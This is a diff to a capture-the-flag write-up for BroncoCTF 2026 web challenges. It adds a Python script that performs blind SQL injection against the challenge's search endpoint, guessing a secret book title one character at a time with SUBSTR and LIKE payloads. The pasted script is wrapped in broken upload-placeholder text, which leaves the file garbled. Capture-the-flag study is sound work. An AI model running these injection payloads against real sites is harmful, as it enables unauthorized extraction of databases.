@@ -1,4 +1,4 @@
-# BroncoCTF 2026 Web Challenges Writeup
+[message.txt](https://github.com/user-attachments/files/29968900/message.txt)# BroncoCTF 2026 Web Challenges Writeup
 
 This writeup covers three web challenges from BroncoCTF, each with a difficulty of 10 points. The solutions demonstrate common web vulnerabilities: **SQL injection**, **exposed API endpoints**, and **information leakage**.
 
@@ -69,7 +69,84 @@ If direct display hadn't worked, we could have extracted the flag character by c
 
 We used this method to discover the title `All_of_the_World_s_Knowledge` before finding the easier path.
 
-<img width="1868" height="1000" alt="image (13)" src="https://github.com/user-attachments/assets/46365828-3f7f-4759-a849-c11c56fbdbb4" />
+[Uploimport requests
+import string
+import time
+
+url = "https://broncoctf-forbidden-archives.chals.io/"
+FAILURE = "No public scrolls bear that name"
+COLUMN = "title"
+
+# Character set (add any missing symbols if needed)
+charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}-!@#$%^&*()+=?/"
+
+# ---------- Resume from position 11 ----------
+START_POS = 11
+flag = "All_of_the"  # already known
+
+print(f"[+] Resuming from position {START_POS} with current flag: {flag}")
+
+for pos in range(START_POS, 101):  # max 100 chars
+    found = False
+    for ch in charset:
+        payload = f"') AND (SELECT SUBSTR({COLUMN}, {pos}, 1) FROM books WHERE is_secret=1 LIMIT 1) = '{ch}' --"
+        # Retry up to 3 times on connection errors
+        for attempt in range(3):
+            try:
+                response = requests.get(url, params={"search": payload}, timeout=5)
+                break
+            except (requests.ConnectionError, requests.Timeout):
+                print(f"[!] Network error, retrying in 1s (attempt {attempt+1})...")
+                time.sleep(1)
+        else:
+            print("[!] Max retries reached, skipping this character.")
+            continue
+
+        if FAILURE not in response.text:
+            flag += ch
+            print(f"[+] Pos {pos}: '{ch}' → {flag}")
+            found = True
+            break
+
+    if not found:
+        # Try LIKE as fallback (case-insensitive)
+        for ch in charset:
+            payload = f"') AND (SELECT SUBSTR({COLUMN}, {pos}, 1) FROM books WHERE is_secret=1 LIMIT 1) LIKE '{ch}' --"
+            for attempt in range(3):
+                try:
+                    response = requests.get(url, params={"search": payload}, timeout=5)
+                    break
+                except (requests.ConnectionError, requests.Timeout):
+                    time.sleep(1)
+            else:
+                continue
+
+            if FAILURE not in response.text:
+                flag += ch
+                print(f"[+] Pos {pos}: '{ch}' (via LIKE) → {flag}")
+                found = True
+                break
+
+    if not found:
+        # Check for closing brace '}' (common in CTF flags)
+        payload = f"') AND (SELECT SUBSTR({COLUMN}, {pos}, 1) FROM books WHERE is_secret=1 LIMIT 1) = '}}' --"
+        try:
+            response = requests.get(url, params={"search": payload}, timeout=5)
+        except:
+            print("[!] Network error on final check, skipping.")
+            continue
+        if FAILURE not in response.text:
+            flag += "}"
+            print(f"\n🎉 COMPLETE FLAG: {flag}")
+            break
+        else:
+            print(f"[!] No character found at position {pos}. Flag likely ends at {pos-1}.")
+            print(f"🎉 FINAL FLAG: {flag}")
+            break
+
+    # Small delay to avoid rate‑limiting
+    time.sleep(0.2)ading message.txt…]()
+
 
 ### Flag
 
